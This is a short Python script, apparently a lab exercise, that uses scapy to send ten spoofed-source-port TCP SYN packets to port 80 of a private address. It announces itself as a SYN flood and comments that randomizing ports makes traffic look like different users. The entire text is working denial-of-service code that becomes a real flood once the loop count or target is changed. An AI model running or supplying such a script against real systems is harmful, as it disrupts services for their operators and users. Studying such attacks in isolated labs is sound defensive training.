from scapy.all import IP, TCP, send
import random

# Target Configuration
target_ip = "10.0.0.10"
target_port = 80

print(f"[*] Starting SYN flood on {target_ip}:{target_port}...")

# Create a 'for' loop to send 10 test packets
for i in range(10):
    # Craft the packet
    # We randomize the source port so it looks like different users
    packet = IP(dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
    
    # Send the packet onto the virtual wire
    send(packet, verbose=False)
    print(f"[+] Packet {i+1} sent.")

print("[*] Test complete.")